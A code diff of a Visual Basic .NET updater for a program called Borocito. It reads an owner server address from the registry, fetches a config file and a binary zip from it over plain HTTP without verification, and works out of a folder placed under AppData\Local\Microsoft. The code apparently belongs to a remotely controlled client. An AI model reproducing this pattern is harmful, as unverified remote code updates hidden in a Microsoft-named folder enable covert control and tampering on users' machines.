@@ -9,6 +9,7 @@ Module GlobalUses
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
     Public OwnerServer As String = Nothing
+    Public BorocitoVersion As String = Nothing
 End Module
 Module Utility
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
@@ -47,16 +48,33 @@ Module Utility
 End Module
 Module StartUp
     Sub Init()
+        AddToLog("Init", "Borocito Updater " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Threading.Thread.Sleep(5000)
         Try
             'Inicia desde otra ubicacion
             RunFromLocation()
+            'Evita multi-instancias
+            OnlyOneInstance()
             'Cargar direccion
             LoadSetting()
             'Buscar actualizaciones
             PreSearch()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub OnlyOneInstance()
+        Try
+            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
+            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
+            If p.Count > 1 Then
+                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
+                End
+            Else
+                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
+            End If
+        Catch ex As Exception
+            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub RunFromLocation()
@@ -104,6 +122,7 @@ Module StartUp
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             OwnerServer = regKey.GetValue("OwnerServer")
+            BorocitoVersion = regKey.GetValue("Version").Split(" ")(0)
         Catch ex As Exception
             AddToLog("LoadSetting@StartUp", "Error: " & ex.Message, True)
             End
@@ -115,14 +134,14 @@ Module Updater
     Dim WithEvents UpdateDownloader As New Net.WebClient
     Dim UpdateDownloaderURI As Uri
     Dim BinaryZipFile As String = DIRTemp & "\Borocitos.zip"
-    Dim ClientLocalFile As String = DIRCommons & "\Client.ini"
+    Dim ClientLocalFile As String = DIRTemp & "\Globals.ini"
     Sub PreSearch()
         Try
             AddToLog("PreSearch@Updater", "Inicializando Updater...", False)
             If My.Computer.FileSystem.FileExists(ClientLocalFile) Then
                 My.Computer.FileSystem.DeleteFile(ClientLocalFile)
             End If
-            Dim ClientRemoteFile As String = "http://" & OwnerServer & "/Client.ini"
+            Dim ClientRemoteFile As String = "http://" & OwnerServer & "/Globals.ini" 'posible redireccion si es HTTPS
             My.Computer.Network.DownloadFile(ClientRemoteFile, ClientLocalFile)
             If forceUpdate Then
                 AddToLog("PreSearch@Updater", "Forzando la descarga del binarios...", False)
@@ -139,7 +158,8 @@ Module Updater
     End Sub
     Sub CheckForUpdates()
         Try
-            Dim versionLocal = My.Application.Info.Version 'nope, debe ser la version de borocito, aunque igual es lo mismo pensando que Borocito no es Borocito.exe, si no que todo el paquete.
+            'Dim versionLocal = My.Application.Info.Version 'nope, debe ser la version de borocito, aunque igual es lo mismo pensando que Borocito no es Borocito.exe, si no que todo el paquete.
+            Dim versionLocal = New Version(BorocitoVersion)
             Dim versionRemote = New Version(GetIniValue("Assembly", "Version", ClientLocalFile))
             Dim result = versionLocal.CompareTo(versionRemote)
             If (result < 0) Then 'Desactualizado
@@ -159,7 +179,7 @@ Module Updater
     Sub StartDownload()
         Try
             AddToLog("StartDownload@Updater", "Iniciando descarga de binarios...", False)
-            UpdateDownloaderURI = New Uri(GetIniValue("Updates", "Binaries", ClientLocalFile))
+            UpdateDownloaderURI = New Uri(GetIniValue("Binaries", "Borocito", ClientLocalFile))
             UpdateDownloader.DownloadFileAsync(UpdateDownloaderURI, BinaryZipFile)
         Catch ex As Exception
             AddToLog("StartDownload@Updater", "Error: " & ex.Message, True)
